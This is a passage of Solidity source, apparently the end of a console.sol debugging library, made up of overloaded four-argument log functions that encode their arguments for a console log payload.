1199	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,string)", p0, p1, p2, p3));
1200	 }
1201	 function log(bool p0, address p1, bool p2, bool p3) internal view {
1202	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,bool)", p0, p1, p2, p3));
1203	 }
1204	 function log(bool p0, address p1, bool p2, address p3) internal view {
1205	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,address)", p0, p1, p2, p3));
1206	 }
1207	 function log(bool p0, address p1, address p2, uint p3) internal view {
1208	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,address,uint)", p0, p1, p2, p3));
1209	 }
1210	 function log(bool p0, address p1, address p2, string memory p3) internal view {
1211	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,address,string)", p0, p1, p2, p3));
1212	 }
1213	 function log(bool p0, address p1, address p2, bool p3) internal view {
1214	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,address,bool)", p0, p1, p2, p3));
1215	 }
1216	 function log(bool p0, address p1, address p2, address p3) internal view {
1217	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,address,address)", p0, p1, p2, p3));
1218	 }
1219	 function log(address p0, uint p1, uint p2, uint p3) internal view {
1220	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,uint)", p0, p1, p2, p3));
1221	 }
1222	 function log(address p0, uint p1, uint p2, string memory p3) internal view {
1223	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,string)", p0, p1, p2, p3));
1224	 }
1225	 function log(address p0, uint p1, uint p2, bool p3) internal view {
1226	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,bool)", p0, p1, p2, p3));
1227	 }
1228	 function log(address p0, uint p1, uint p2, address p3) internal view {
1229	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,address)", p0, p1, p2, p3));
1230	 }
1231	 function log(address p0, uint p1, string memory p2, uint p3) internal view {
1232	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,string,uint)", p0, p1, p2, p3));
1233	 }
1234	 function log(address p0, uint p1, string memory p2, string memory p3) internal view {
1235	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,string,string)", p0, p1, p2, p3));
1236	 }
1237	 function log(address p0, uint p1, string memory p2, bool p3) internal view {
1238	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,string,bool)", p0, p1, p2, p3));
1239	 }
1240	 function log(address p0, uint p1, string memory p2, address p3) internal view {
1241	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,string,address)", p0, p1, p2, p3));
1242	 }
1243	 function log(address p0, uint p1, bool p2, uint p3) internal view {
1244	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,uint)", p0, p1, p2, p3));
1245	 }
1246	 function log(address p0, uint p1, bool p2, string memory p3) internal view {
1247	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,string)", p0, p1, p2, p3));
1248	 }
1249	 function log(address p0, uint p1, bool p2, bool p3) internal view {
1250	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,bool)", p0, p1, p2, p3));
1251	 }
1252	 function log(address p0, uint p1, bool p2, address p3) internal view {
1253	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,address)", p0, p1, p2, p3));
1254	 }
1255	 function log(address p0, uint p1, address p2, uint p3) internal view {
1256	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,address,uint)", p0, p1, p2, p3));
1257	 }
1258	 function log(address p0, uint p1, address p2, string memory p3) internal view {
1259	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,address,string)", p0, p1, p2, p3));
1260	 }
1261	 function log(address p0, uint p1, address p2, bool p3) internal view {
1262	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,address,bool)", p0, p1, p2, p3));
1263	 }
1264	 function log(address p0, uint p1, address p2, address p3) internal view {
1265	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,address,address)", p0, p1, p2, p3));
1266	 }
1267	 function log(address p0, string memory p1, uint p2, uint p3) internal view {
1268	 _sendLogPayload(abi.encodeWithSignature("log(address,string,uint,uint)", p0, p1, p2, p3));
1269	 }
1270	 function log(address p0, string memory p1, uint p2, string memory p3) internal view {
1271	 _sendLogPayload(abi.encodeWithSignature("log(address,string,uint,string)", p0, p1, p2, p3));
1272	 }
1273	 function log(address p0, string memory p1, uint p2, bool p3) internal view {
1274	 _sendLogPayload(abi.encodeWithSignature("log(address,string,uint,bool)", p0, p1, p2, p3));
1275	 }
1276	 function log(address p0, string memory p1, uint p2, address p3) internal view {
1277	 _sendLogPayload(abi.encodeWithSignature("log(address,string,uint,address)", p0, p1, p2, p3));
1278	 }
1279	 function log(address p0, string memory p1, string memory p2, uint p3) internal view {
1280	 _sendLogPayload(abi.encodeWithSignature("log(address,string,string,uint)", p0, p1, p2, p3));
1281	 }
1282	 function log(address p0, string memory p1, string memory p2, string memory p3) internal view {
1283	 _sendLogPayload(abi.encodeWithSignature("log(address,string,string,string)", p0, p1, p2, p3));
1284	 }
1285	 function log(address p0, string memory p1, string memory p2, bool p3) internal view {
1286	 _sendLogPayload(abi.encodeWithSignature("log(address,string,string,bool)", p0, p1, p2, p3));
1287	 }
1288	 function log(address p0, string memory p1, string memory p2, address p3) internal view {
1289	 _sendLogPayload(abi.encodeWithSignature("log(address,string,string,address)", p0, p1, p2, p3));
1290	 }
1291	 function log(address p0, string memory p1, bool p2, uint p3) internal view {
1292	 _sendLogPayload(abi.encodeWithSignature("log(address,string,bool,uint)", p0, p1, p2, p3));
1293	 }
1294	 function log(address p0, string memory p1, bool p2, string memory p3) internal view {
1295	 _sendLogPayload(abi.encodeWithSignature("log(address,string,bool,string)", p0, p1, p2, p3));
1296	 }
1297	 function log(address p0, string memory p1, bool p2, bool p3) internal view {
1298	 _sendLogPayload(abi.encodeWithSignature("log(address,string,bool,bool)", p0, p1, p2, p3));
1299	 }
1300	 function log(address p0, string memory p1, bool p2, address p3) internal view {
1301	 _sendLogPayload(abi.encodeWithSignature("log(address,string,bool,address)", p0, p1, p2, p3));
1302	 }
1303	 function log(address p0, string memory p1, address p2, uint p3) internal view {
1304	 _sendLogPayload(abi.encodeWithSignature("log(address,string,address,uint)", p0, p1, p2, p3));
1305	 }
1306	 function log(address p0, string memory p1, address p2, string memory p3) internal view {
1307	 _sendLogPayload(abi.encodeWithSignature("log(address,string,address,string)", p0, p1, p2, p3));
1308	 }
1309	 function log(address p0, string memory p1, address p2, bool p3) internal view {
1310	 _sendLogPayload(abi.encodeWithSignature("log(address,string,address,bool)", p0, p1, p2, p3));
1311	 }
1312	 function log(address p0, string memory p1, address p2, address p3) internal view {
1313	 _sendLogPayload(abi.encodeWithSignature("log(address,string,address,address)", p0, p1, p2, p3));
1314	 }
1315	 function log(address p0, bool p1, uint p2, uint p3) internal view {
1316	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,uint)", p0, p1, p2, p3));
1317	 }
1318	 function log(address p0, bool p1, uint p2, string memory p3) internal view {
1319	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,string)", p0, p1, p2, p3));
1320	 }
1321	 function log(address p0, bool p1, uint p2, bool p3) internal view {
1322	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,bool)", p0, p1, p2, p3));
1323	 }
1324	 function log(address p0, bool p1, uint p2, address p3) internal view {
1325	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,address)", p0, p1, p2, p3));
1326	 }
1327	 function log(address p0, bool p1, string memory p2, uint p3) internal view {
1328	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,string,uint)", p0, p1, p2, p3));
1329	 }
1330	 function log(address p0, bool p1, string memory p2, string memory p3) internal view {
1331	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,string,string)", p0, p1, p2, p3));
1332	 }
1333	 function log(address p0, bool p1, string memory p2, bool p3) internal view {
1334	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,string,bool)", p0, p1, p2, p3));
1335	 }
1336	 function log(address p0, bool p1, string memory p2, address p3) internal view {
1337	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,string,address)", p0, p1, p2, p3));
1338	 }
1339	 function log(address p0, bool p1, bool p2, uint p3) internal view {
1340	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,uint)", p0, p1, p2, p3));
1341	 }
1342	 function log(address p0, bool p1, bool p2, string memory p3) internal view {
1343	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,string)", p0, p1, p2, p3));
1344	 }
1345	 function log(address p0, bool p1, bool p2, bool p3) internal view {
1346	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,bool)", p0, p1, p2, p3));
1347	 }
1348	 function log(address p0, bool p1, bool p2, address p3) internal view {
1349	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,address)", p0, p1, p2, p3));
1350	 }
1351	 function log(address p0, bool p1, address p2, uint p3) internal view {
1352	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,address,uint)", p0, p1, p2, p3));
1353	 }
1354	 function log(address p0, bool p1, address p2, string memory p3) internal view {
1355	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,address,string)", p0, p1, p2, p3));
1356	 }
1357	 function log(address p0, bool p1, address p2, bool p3) internal view {
1358	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,address,bool)", p0, p1, p2, p3));
1359	 }
1360	 function log(address p0, bool p1, address p2, address p3) internal view {
1361	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,address,address)", p0, p1, p2, p3));
1362	 }
1363	 function log(address p0, address p1, uint p2, uint p3) internal view {
1364	 _sendLogPayload(abi.encodeWithSignature("log(address,address,uint,uint)", p0, p1, p2, p3));
1365	 }
1366	 function log(address p0, address p1, uint p2, string memory p3) internal view {
1367	 _sendLogPayload(abi.encodeWithSignature("log(address,address,uint,string)", p0, p1, p2, p3));
1368	 }
1369	 function log(address p0, address p1, uint p2, bool p3) internal view {
1370	 _sendLogPayload(abi.encodeWithSignature("log(address,address,uint,bool)", p0, p1, p2, p3));
1371	 }
1372	 function log(address p0, address p1, uint p2, address p3) internal view {
1373	 _sendLogPayload(abi.encodeWithSignature("log(address,address,uint,address)", p0, p1, p2, p3));
1374	 }
1375	 function log(address p0, address p1, string memory p2, uint p3) internal view {
1376	 _sendLogPayload(abi.encodeWithSignature("log(address,address,string,uint)", p0, p1, p2, p3));
1377	 }
1378	 function log(address p0, address p1, string memory p2, string memory p3) internal view {
1379	 _sendLogPayload(abi.encodeWithSignature("log(address,address,string,string)", p0, p1, p2, p3));
1380	 }
1381	 function log(address p0, address p1, string memory p2, bool p3) internal view {
1382	 _sendLogPayload(abi.encodeWithSignature("log(address,address,string,bool)", p0, p1, p2, p3));
1383	 }
1384	 function log(address p0, address p1, string memory p2, address p3) internal view {
1385	 _sendLogPayload(abi.encodeWithSignature("log(address,address,string,address)", p0, p1, p2, p3));
1386	 }
1387	 function log(address p0, address p1, bool p2, uint p3) internal view {
1388	 _sendLogPayload(abi.encodeWithSignature("log(address,address,bool,uint)", p0, p1, p2, p3));
1389	 }
1390	 function log(address p0, address p1, bool p2, string memory p3) internal view {
1391	 _sendLogPayload(abi.encodeWithSignature("log(address,address,bool,string)", p0, p1, p2, p3));
1392	 }
1393	 function log(address p0, address p1, bool p2, bool p3) internal view {
1394	 _sendLogPayload(abi.encodeWithSignature("log(address,address,bool,bool)", p0, p1, p2, p3));
1395	 }
1396	 function log(address p0, address p1, bool p2, address p3) internal view {
1397	 _sendLogPayload(abi.encodeWithSignature("log(address,address,bool,address)", p0, p1, p2, p3));
1398	 }
1399	 function log(address p0, address p1, address p2, uint p3) internal view {
1400	 _sendLogPayload(abi.encodeWithSignature("log(address,address,address,uint)", p0, p1, p2, p3));
1401	 }
1402	 function log(address p0, address p1, address p2, string memory p3) internal view {
1403	 _sendLogPayload(abi.encodeWithSignature("log(address,address,address,string)", p0, p1, p2, p3));
1404	 }
1405	 function log(address p0, address p1, address p2, bool p3) internal view {
1406	 _sendLogPayload(abi.encodeWithSignature("log(address,address,address,bool)", p0, p1, p2, p3));
1407	 }
1408	 function log(address p0, address p1, address p2, address p3) internal view {
1409	 _sendLogPayload(abi.encodeWithSignature("log(address,address,address,address)", p0, p1, p2, p3));
1410	 }
1411	 }
